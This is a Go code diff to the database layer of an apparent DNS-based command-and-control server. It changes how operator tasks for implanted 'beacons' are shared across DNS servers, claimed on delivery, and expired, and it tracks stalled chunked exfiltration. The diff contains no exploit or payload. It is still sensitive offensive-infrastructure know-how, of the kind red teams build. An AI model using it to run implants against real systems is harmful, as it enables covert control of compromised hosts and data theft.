@@ -202,7 +202,8 @@ func (d *MasterDatabase) migration1InitialSchema() error {
 		beacon_id TEXT NOT NULL,
 		command TEXT NOT NULL,
 		status TEXT NOT NULL DEFAULT 'pending',
-		assigned_dns_server TEXT NOT NULL,
+		assigned_dns_server TEXT,
+		delivered_by_dns_server TEXT,
 		created_by TEXT,
 		created_at INTEGER NOT NULL,
 		sent_at INTEGER,
@@ -212,7 +213,8 @@ func (d *MasterDatabase) migration1InitialSchema() error {
 		chunk_count INTEGER DEFAULT 0,
 		metadata TEXT,
 		FOREIGN KEY (beacon_id) REFERENCES beacons(id) ON DELETE CASCADE,
-		FOREIGN KEY (assigned_dns_server) REFERENCES dns_servers(id) ON DELETE CASCADE,
+		FOREIGN KEY (assigned_dns_server) REFERENCES dns_servers(id) ON DELETE SET NULL,
+		FOREIGN KEY (delivered_by_dns_server) REFERENCES dns_servers(id) ON DELETE SET NULL,
 		FOREIGN KEY (created_by) REFERENCES operators(id) ON DELETE SET NULL
 	);
 
@@ -220,6 +222,7 @@ func (d *MasterDatabase) migration1InitialSchema() error {
 	CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status);
 	CREATE INDEX IF NOT EXISTS idx_tasks_created_at ON tasks(created_at);
 	CREATE INDEX IF NOT EXISTS idx_tasks_assigned_dns ON tasks(assigned_dns_server);
+	CREATE INDEX IF NOT EXISTS idx_tasks_delivered_by_dns ON tasks(delivered_by_dns_server);
 	CREATE INDEX IF NOT EXISTS idx_tasks_created_by ON tasks(created_by);
 	CREATE INDEX IF NOT EXISTS idx_tasks_status_created ON tasks(status, created_at DESC);
 	CREATE INDEX IF NOT EXISTS idx_tasks_sync ON tasks(status, synced_at, completed_at);
@@ -1069,6 +1072,36 @@ func (d *MasterDatabase) GetTaskResultProgress(taskID string) (int, int, error) 
 	return receivedChunks, totalChunks, err
 }
 
+// MarkTaskDelivered atomically marks a task as delivered by a specific DNS server
+// Returns true if this server successfully claimed the task, false if already claimed
+func (d *MasterDatabase) MarkTaskDelivered(taskID, dnsServerID string) (bool, error) {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	now := time.Now().Unix()
+
+	// Atomic update: only succeed if task is still pending
+	result, err := d.db.Exec(`
+		UPDATE tasks 
+		SET status = 'sent',
+		    delivered_by_dns_server = ?,
+		    sent_at = ?
+		WHERE id = ? AND status = 'pending'
+	`, dnsServerID, now, taskID)
+
+	if err != nil {
+		return false, err
+	}
+
+	rowsAffected, err := result.RowsAffected()
+	if err != nil {
+		return false, err
+	}
+
+	// If rowsAffected == 0, task was already delivered by another DNS server
+	return rowsAffected > 0, nil
+}
+
 // Client Binary operations
 
 // SaveClientBinary stores a pre-built client binary with chunks for stager deployment
@@ -1814,15 +1847,16 @@ func (d *MasterDatabase) GetEnabledDNSDomains() ([]string, error) {
 }
 
 // CreateTask creates a new task for a specific beacon
+// Task is available to ALL DNS servers until one delivers it
 func (d *MasterDatabase) CreateTask(beaconID, command, createdBy string) (string, error) {
 	d.mutex.Lock()
 	defer d.mutex.Unlock()
 
-	// Get the beacon's assigned DNS server
-	var dnsServerID string
+	// Verify beacon exists and is active
+	var exists int
 	err := d.db.QueryRow(`
-		SELECT dns_server_id FROM beacons WHERE id = ? AND status = 'active'
-	`, beaconID).Scan(&dnsServerID)
+		SELECT 1 FROM beacons WHERE id = ? AND status = 'active'
+	`, beaconID).Scan(&exists)
 
 	if err != nil {
 		if err == sql.ErrNoRows {
@@ -1835,11 +1869,11 @@ func (d *MasterDatabase) CreateTask(beaconID, command, createdBy string) (string
 	taskID := generateTaskID()
 	now := time.Now().Unix()
 
-	// Create task
+	// Create task WITHOUT assigned_dns_server (available to all)
 	_, err = d.db.Exec(`
-		INSERT INTO tasks (id, beacon_id, command, status, assigned_dns_server, created_by, created_at)
-		VALUES (?, ?, ?, 'pending', ?, ?, ?)
-	`, taskID, beaconID, command, dnsServerID, createdBy, now)
+		INSERT INTO tasks (id, beacon_id, command, status, created_by, created_at)
+		VALUES (?, ?, ?, 'pending', ?, ?)
+	`, taskID, beaconID, command, createdBy, now)
 
 	if err != nil {
 		return "", fmt.Errorf("failed to create task: %w", err)
@@ -1848,16 +1882,21 @@ func (d *MasterDatabase) CreateTask(beaconID, command, createdBy string) (string
 	return taskID, nil
 }
 
-// GetTasksForDNSServer retrieves pending tasks assigned to a DNS server's beacons
+// GetTasksForDNSServer retrieves pending tasks for beacons that have contacted this DNS server
+// Returns ALL pending tasks regardless of which server will deliver them (Shadow Mesh)
 func (d *MasterDatabase) GetTasksForDNSServer(dnsServerID string) ([]map[string]interface{}, error) {
 	d.mutex.RLock()
 	defer d.mutex.RUnlock()
 
+	// Get ALL pending tasks for beacons that have ever contacted this DNS server
+	// This allows any DNS server to deliver tasks for beacons in its rotation
 	rows, err := d.db.Query(`
-		SELECT id, beacon_id, command, status, created_at
-		FROM tasks
-		WHERE assigned_dns_server = ? AND status = 'pending'
-		ORDER BY created_at ASC
+		SELECT DISTINCT t.id, t.beacon_id, t.command, t.status, t.created_at
+		FROM tasks t
+		INNER JOIN beacon_dns_contacts bdc ON t.beacon_id = bdc.beacon_id
+		WHERE bdc.dns_server_id = ? 
+		  AND t.status = 'pending'
+		ORDER BY t.created_at ASC
 	`, dnsServerID)
 	if err != nil {
 		return nil, err
@@ -2914,6 +2953,63 @@ func (d *MasterDatabase) CleanupCompletedStagerSessions(olderThanDays int) (int,
 	`, cutoff)
 	if err != nil {
 		return 0, fmt.Errorf("failed to delete stager sessions: %w", err)
+	}
+
+	rows, err := result.RowsAffected()
+	return int(rows), err
+}
+
+// CleanupStalePendingTasks marks pending tasks as expired if they've been pending too long
+// This handles cases where beacons are lost/killed before claiming a task
+// For long-term engagements (30min+ callbacks), 48 hours is reasonable timeout
+func (d *MasterDatabase) CleanupStalePendingTasks(pendingHours int) (int, error) {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	cutoff := time.Now().Add(-time.Duration(pendingHours) * time.Hour).Unix()
+
+	// Mark stale pending tasks as expired
+	result, err := d.db.Exec(`
+		UPDATE tasks 
+		SET status = 'expired',
+		    completed_at = ?
+		WHERE status = 'pending' 
+		  AND created_at < ?
+	`, time.Now().Unix(), cutoff)
+	if err != nil {
+		return 0, fmt.Errorf("failed to expire stale pending tasks: %w", err)
+	}
+
+	rows, err := result.RowsAffected()
+	return int(rows), err
+}
+
+// DetectPartialResults marks tasks as 'partial' if chunks are incomplete after timeout
+// This helps operators identify stuck exfiltrations from beacons that died mid-transfer
+// Checks tasks in 'sent' status with incomplete chunked results
+func (d *MasterDatabase) DetectPartialResults(sentHours int) (int, error) {
+	d.mutex.Lock()
+	defer d.mutex.Unlock()
+
+	cutoff := time.Now().Add(-time.Duration(sentHours) * time.Hour).Unix()
+
+	// Find tasks that have been 'sent' for too long with incomplete chunks
+	// A task is incomplete if: total_chunks > 0 AND received_chunks < total_chunks
+	result, err := d.db.Exec(`
+		UPDATE tasks 
+		SET status = 'partial',
+		    completed_at = ?
+		WHERE status = 'sent'
+		  AND delivered_at < ?
+		  AND EXISTS (
+			  SELECT 1 FROM task_progress 
+			  WHERE task_progress.task_id = tasks.id
+				AND task_progress.total_chunks > 0
+				AND task_progress.received_chunks < task_progress.total_chunks
+		  )
+	`, time.Now().Unix(), cutoff)
+	if err != nil {
+		return 0, fmt.Errorf("failed to detect partial results: %w", err)
 	}
 
 	rows, err := result.RowsAffected()
